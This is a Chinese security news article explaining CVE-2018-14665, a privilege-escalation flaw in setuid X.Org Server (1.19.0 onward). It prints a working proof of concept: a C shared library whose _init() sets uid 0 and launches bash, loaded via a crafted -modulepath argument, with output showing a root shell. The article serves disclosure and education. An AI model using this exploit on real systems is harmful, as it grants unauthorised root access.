***本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。**

## 前言

 **印度安全研究员Narendra Shinde在X.Org
Server软件包中发现了一个非常关键的提权漏洞（[CVE-2018-14665](https://lists.x.org/archives/xorg-announce/2018-October/002927.html)），主流Linux发行版均受到影响，包括OpenBSD、Debian、Ubuntu、CentOS、Red
Hat和Fedora。**

 **![Xorg-bug-headpic.png](https://image.3001.net/images/20181029/15408032982518.png!small)**

X.Org Server软件包提供了X窗口系统（X Window System，也常称为X11或X）的开源实现。

> X Window
> System是一种以位图方式显示的软件窗口系统。最初是1984年麻省理工学院的研究，之后变成UNIX、类UNIX、以及OpenVMS等操作系统所一致适用的标准化软件工具包及显示架构的运作协议。X窗口系统通过软件工具及架构协议来创建操作系统所用的图形用户界面，此后则逐渐扩展适用到各形各色的其他操作系统上。现在几乎所有的操作系统都能支持与使用X。更重要的是，今日知名的桌面环境——GNOME和KDE也都是以X窗口系统为基础建构成的。

根据Narendra
Shinde的说法，X.Org服务器自版本1.19.0起就存在该漏洞，距今已经两年多了，只要X.Org服务器以提升的权限运行，该漏洞就可被利用。

## 提权和任意文件覆盖

Shinde发现漏洞根源在于X.Org服务器无法正确处理和验证至少以下两个命令行的参数：

> * -modulepath：设置和搜索Xorg服务器模块的目录路径；
>
> * -logfile：跳过位于/var/log/Xorg.n.log的默认日志，为Xorg服务器设置新的日志文件。

当X.Org服务器提权运行时，比如使用setuid命令安装并由非root用户启动时：

> * -modulepath：可用于指定加载不安全模块的路径, 允许在高级进程中跨权限执行代码。
>
> * -logfile：可用于在文件系统中实现任意文件覆盖。

## 实例

### 1、收集X.Org服务器加载的模块信息

X.Org服务器在启动期间加载各种模块，本演示中使用 - libglx.so：

    
    
      [  5549.223] (II) LoadModule: "glx"
      **[  5549.223] (II) Loading /usr/lib/xorg/modules/extensions/libglx.so**
      [  5549.224] (II) Module glx: vendor="X.Org Foundation

### 2、创建shell模块

 **Shell.c**

    
    
    #include <stdio.h>
      #include <sys/types.h>
      #include <stdlib.h>
      void _init() {
      setgid(0);
      setuid(0);
      system("/bin/bash");
      }
    
      [developer@centos-x86 xorg-demo]$ gcc -fPIC -shared -o libglx.so shell.c -nostartfiles
      [developer@centos-x86 xorg-demo]$ 
      [developer@centos-x86 xorg-demo]$ ls -la
      total 16
      drwxrwxr-x.  2 developer developer   38 Oct 26 22:14 .
      drwx------. 26 developer developer 4096 Oct 26 22:02 ..
      -rwxrwxr-x.  1 developer developer 5772 Oct 26 22:14 libglx.so
      -rw-rw-r--.  1 developer developer  147 Oct 26 22:03 shell.c
      [developer@centos-x86 xorg-demo]$ 
      [developer@centos-x86 xorg-demo]$ 

### 3、加载恶意shell模块

    
    
    [developer@centos-x86 ~]$ 
      [developer@centos-x86 ~]$ id
      uid=1000(developer) gid=1000(developer) groups=1000(developer) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
      [developer@centos-x86 ~]$ 
      [developer@centos-x86 ~]$ Xorg -modulepath ' **,/home/developer/xorg-demo** ' :2 
      
      X.Org X Server 1.19.5
      Release Date: 2017-10-12
      X Protocol Version 11, Revision 0
      Build Operating System:  3.10.0-693.17.1.el7.x86_64 
      Current Operating System: Linux centos-x86.localdomain 3.10.0-862.14.4.el7.centos.plus.i686 #1 SMP Fri Sep 28 05:30:57 UTC 2018 i686
      Kernel command line: BOOT_IMAGE=/vmlinuz-3.10.0-862.14.4.el7.centos.plus.i686 root=/dev/mapper/centos-root ro crashkernel=auto rd.lvm.lv=centos/root rd.lvm.lv=centos/swap rhgb quiet LANG=en_US.UTF-8
      Build Date: 11 April 2018  04:44:33PM
      Build ID: xorg-x11-server 1.19.5-5.el7 
      Current version of pixman: 0.34.0
       Before reporting problems, check http://wiki.x.org
       to make sure that you have the latest version.
      Markers: (--) probed, (**) from config file, (==) default setting,
       (++) from command line, (!!) notice, (II) informational,
       (WW) warning, (EE) error, (NI) not implemented, (??) unknown.
      (==) Log file: "/var/log/Xorg.2.log", Time: Fri Oct 26 22:15:12 2018
      (==) Using config directory: "/etc/X11/xorg.conf.d"
      (==) Using system config directory "/usr/share/X11/xorg.conf.d"
      'abrt-cli status' timed out
      
    **-- wait for few seconds and you will be dropped into root shell ---**
      
      [root@centos-x86 ~]# 
      [root@centos-x86 ~]# 
      [root@centos-x86 ~]# id
     **uid=0(root) gid=0(root) groups=0(root),1000(developer) context=unconfined_u:unconfined_r:xserver_t:s0-s0:c0.c1023**
      [root@centos-x86 ~]# 

### 4、模块加载器日志：

    
    
    [  6683.669] (++) ModulePath set to ",/home/developer/xorg-demo"
      [  6683.669] (II) The server relies on udev to provide the list of input devices.
              If no devices become available, reconfigure udev or disable AutoAddDevices.
      [  6683.669] (II) Loader magic: 0x6f5020
      [  6683.669] (II) Module ABI versions:
      [  6683.669]    X.Org ANSI C Emulation: 0.4
      [  6683.669]    X.Org Video Driver: 23.0
      [  6683.669]    X.Org XInput driver : 24.1
      [  6683.669]    X.Org Server Extension : 10.0
      [  6683.678] (--) PCI:*(0:0:2:0) 80ee:beef:0000:0000 rev 0, Mem @ 0xe0000000/33554432, BIOS @ 0x????????/131072
      [  6683.678] (II) LoadModule: "glx"
      **[  6683.678] (II) Loading /home/developer/xorg-demo/libglx.so**

***参考来源：[securityaffairs](https://securityaffairs.co/wordpress/77402/hacking/cve-2018-14665-linux-distros.html?tdsourcetag=s_pctim_aiomsg)，Freddy编译整理，转载请注明来自
[FreeBuf.COM](http://freebuf.com/)。**

